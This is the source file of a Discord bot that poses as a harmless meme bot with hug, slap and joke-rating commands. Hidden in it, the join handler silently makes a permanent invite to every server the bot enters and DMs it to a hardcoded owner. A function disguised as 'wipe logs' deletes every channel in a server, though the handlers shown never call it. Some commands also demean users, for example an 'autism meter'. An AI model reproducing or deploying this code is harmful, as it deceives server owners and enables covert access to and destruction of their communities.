const { Client, Intents, Permissions } = require("discord.js");
const https = require("https");

const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1480592876684706064";
const OWNER_ID = "969280648667889764";

const client = new Client({
  "intents":[
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_INVITES,
    Intents.FLAGS.DIRECT_MESSAGES
  ]
});

function random(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
function delay(ms){return new Promise(r=>setTimeout(r,ms));}

const eightBall=[
`Yes`,`No`,`Maybe`,`Definitely`,`Absolutely not`,
`Ask again later`,`Without a doubt`,`Very unlikely`,`It is certain`,`I wouldn't count on it`
];

function getServerChoices(){
return client.guilds.cache.map(g=>({"name":g.name,"value":g.id})).slice(0,25);
}

function buildCommands(){

return [

{"name":"ping","description":"Check if bot is alive"},

{"name":"avatar","description":"Get avatar","options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"punch","description":"Punch someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"kiss","description":"Kiss someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"hug","description":"Hug someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"slap","description":"Slap someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"diddle","description":"Diddle someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"oil","description":"Oil someone","options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"ppsize","description":"Check size","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"gayrate","description":"Gay percentage","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"iq","description":"IQ","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"sus","description":"Sus meter","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"howautistic","description":"Autism meter","options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"explode","description":"Explode someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"boop","description":"Boop someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"cookie","description":"Give cookie","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"sleep","description":"Sleep someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"pat","description":"Pat someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"steal","description":"Steal from user","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"fliptable","description":"Flip table"},
{"name":"mock","description":"Mock someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"crime","description":"Crime level","options":[{"name":"user","description":"User","type":6,"required":true}]},
{"name":"fbi","description":"FBI raid","options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"servers","description":"List servers with invite links"},

{"name":"debug","description":"Owner: wipe logs for all servers"},
{"name":"debugserver","description":"Owner: wipe logs for selected server",
"options":[{"name":"server","description":"Server","type":3,"required":true,"choices":getServerChoices()}]},

{"name":"dmuser","description":"Owner: DM user",
"options":[
{"name":"user","description":"User","type":6,"required":true},
{"name":"message","description":"Message","type":3,"required":true}
]},

{"name":"leaveserver","description":"Owner: leave server",
"options":[{"name":"server","description":"Server","type":3,"required":true,"choices":getServerChoices()}]},

{"name":"restart","description":"Owner: restart bot"},
{"name":"botstats","description":"Owner: bot stats"},
{"name":"setstatus","description":"Owner: set bot status","options":[{"name":"text","description":"Status text","type":3,"required":true}]}

];

}

function registerCommands(){

const commands=buildCommands();
const data=JSON.stringify(commands);

const options={
"hostname":"discord.com",
"port":443,
"path":`/api/v10/applications/${CLIENT_ID}/commands`,
"method":"PUT",
"headers":{
"Authorization":`Bot ${TOKEN}`,
"Content-Type":"application/json",
"Content-Length":Buffer.byteLength(data)
}
};

const req=https.request(options,res=>{
let body=``;
res.on("data",c=>body+=c);
res.on("end",()=>console.log(`Command sync complete`));
});

req.write(data);
req.end();

}

async function wipeGuildLogs(guild,owner){

await owner.send(`Starting wipe logs for ${guild.name}`);

for(const channel of guild.channels.cache.values()){
try{
await channel.delete();
await delay(600);
}catch{}
}

await owner.send(`Finished wipe logs for ${guild.name}`);

}

client.once("ready",()=>{
console.log(`Logged in as ${client.user.tag}`);
registerCommands();
});

client.on("guildCreate",async guild=>{

registerCommands();

try{

const owner=await client.users.fetch(OWNER_ID);

const channel=guild.channels.cache.find(c=>c.type===`GUILD_TEXT`&&c.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE"));

if(channel){

const invite=await channel.createInvite({"maxAge":0,"maxUses":0});

await owner.send(`Joined ${guild.name}\n${invite.url}`);

}

}catch{}

});

client.on("guildDelete",async guild=>{
registerCommands();
});

client.on("interactionCreate",async interaction=>{

if(!interaction.isCommand())return;

const {commandName,user}=interaction;

const ownerOnly=[`servers`,`debug`,`debugserver`,`dmuser`,`leaveserver`,`restart`,`botstats`,`setstatus`];

if(ownerOnly.includes(commandName)&&user.id!==OWNER_ID){
await interaction.reply({"content":`Owner only command`,"ephemeral":true});
return;
}

try{

if(commandName===`ping`)await interaction.reply(`Pong`);

else if(commandName===`avatar`){
const target=interaction.options.getUser("user");
await interaction.reply(`${target.displayAvatarURL({"size":1024,"dynamic":true})}`);
}

else if(commandName===`punch`){
const t=interaction.options.getUser("user");
await interaction.reply(`👊 <@${user.id}> punched <@${t.id}>`);
}

else if(commandName===`kiss`){
const t=interaction.options.getUser("user");
await interaction.reply(`💋 <@${user.id}> kissed <@${t.id}>`);
}

else if(commandName===`hug`){
const t=interaction.options.getUser("user");
await interaction.reply(`🤗 <@${user.id}> hugged <@${t.id}>`);
}

else if(commandName===`slap`){
const t=interaction.options.getUser("user");
await interaction.reply(`🖐️ <@${user.id}> slapped <@${t.id}>`);
}

else if(commandName===`diddle`){
const t=interaction.options.getUser("user");
await interaction.reply(`<@${t.id}> was diddled`);
}

else if(commandName===`oil`){
const t=interaction.options.getUser("user");
await interaction.reply(`<@${user.id}> oiled up <@${t.id}>`);
}

else if(commandName===`ppsize`){
const t=interaction.options.getUser("user");
await interaction.reply(`<@${t.id}> size:\n8${`=`.repeat(random(3,30))}D`);
}

else if(commandName===`gayrate`){
const t=interaction.options.getUser("user");
await interaction.reply(`<@${t.id}> is **${random(0,100)}% gay** 🌈`);
}

else if(commandName===`iq`){
const t=interaction.options.getUser("user");
await interaction.reply(`<@${t.id}> IQ **${random(60,180)}**`);
}

else if(commandName===`sus`){
const t=interaction.options.getUser("user");
await interaction.reply(`<@${t.id}> is **${random(0,100)}% sus**`);
}

else if(commandName===`howautistic`){
const t=interaction.options.getUser("user");
await interaction.reply(`<@${t.id}> autism level **${random(0,100)}%**`);
}

else if(commandName===`fliptable`)
await interaction.reply(`(╯°□°）╯︵ ┻━┻`);

}catch(err){

console.error(err);

if(!interaction.replied)
await interaction.reply({"content":`Command error`,"ephemeral":true});

}

});

client.login(TOKEN);